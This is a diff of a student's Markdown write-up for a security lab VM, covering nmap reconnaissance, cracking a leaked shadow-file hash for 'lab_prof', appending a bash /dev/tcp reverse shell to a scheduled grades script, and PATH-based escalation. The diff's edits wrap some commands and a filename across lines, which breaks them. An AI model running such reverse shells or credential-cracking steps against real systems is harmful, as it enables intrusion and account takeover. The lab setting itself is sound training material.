@@ -1,7 +1,7 @@
 ### Exercise 1: Setup
 
-1. 
-Downlaoded the given (VM)[https://drive.google.com/file/d/1FSZp7cF33Qq6zfaRVDj68LXkYKGVzWhB/view?usp=sharing)]  and installed on vmware.
+__1Q__. 
+Downloaded the given [VM](https://drive.google.com/file/d/1FSZp7cF33Qq6zfaRVDj68LXkYKGVzWhB/view?usp=sharing) and opened with vmware.
 
 __2. Start the VM and log in with the credentials ‘ip_address:ip_address’. This will give you
 the IP address of the machine. (Make sure the VM is in the same network as the
@@ -130,7 +130,8 @@ __Differences__
 __3. Look at all the discovered ports and obtain as much information as possible.__
 
 ```bash
-$ nmap  -sC -sV  --version-intensity 5   -p 21,22,80  nmap/more_agressive 192.168.37.130  
+$ nmap  -sC -sV  --version-intensity 5   -p 21,22,80  nmap/more_agressive 
+192.168.37.130  
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 15:54 EDT
 Unable to split netmask from target expression: "nmap/more_agressive"
 Nmap scan report for security-lab (192.168.37.130)
@@ -345,7 +346,9 @@ __2. user ‘lab_prof’.__
 lab_student@lab:~$ cat /var/backups/safety_backup
 # Saving my entry of the /etc/shadow file. Just in case a hacker modifies it!!!
 
-lab_prof:$6$2ovzYOy.y4KiJju8$tgrxr.dpK20mRYpmD.SvyFIJPwYwA/ogXnPGQjgB2nNM2gmQYneVoegDaLriFwefGFoxxsHXnpSSapVxNTlFt0:18728:0:99999:7:::
+lab_prof:$6$2ovzYOy.y4KiJju8$tgrxr.dpK20mRYpmD.
+SvyFIJPwYwA/ogXnPGQjgB2nNM2gmQYneVoegDaLriFwefGFoxxsHXnpSSapVxNTlFt0:18728:0:
+99999:7:::
 ```
 
 __Cracking the hash__
@@ -450,7 +453,8 @@ echo "All students failed" >> /tmp/secret_grades`
 - Adding our reverse shell into the `.save_student_grades` file
 
 ```bash
-lab_prof@lab:~$ echo "bash -i >& /dev/tcp/192.168.37.128/4242 0>&1" >> .save_student_grades 
+lab_prof@lab:~$ echo "bash -i >& /dev/tcp/192.168.37.128/4242 0>&1" >> .save_
+student_grades 
 lab_prof@lab:~$ cat .save_student_grades 
 #!/bin/bash
 
@@ -531,7 +535,8 @@ __Setting up the path__
 
 ```bash
 $PATH
-/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local
+/games:/snap/bin
 ```
 - We can see that binaries are first looked in `/usr/local/sbin` then `/usr/local/bin` and so on..
 
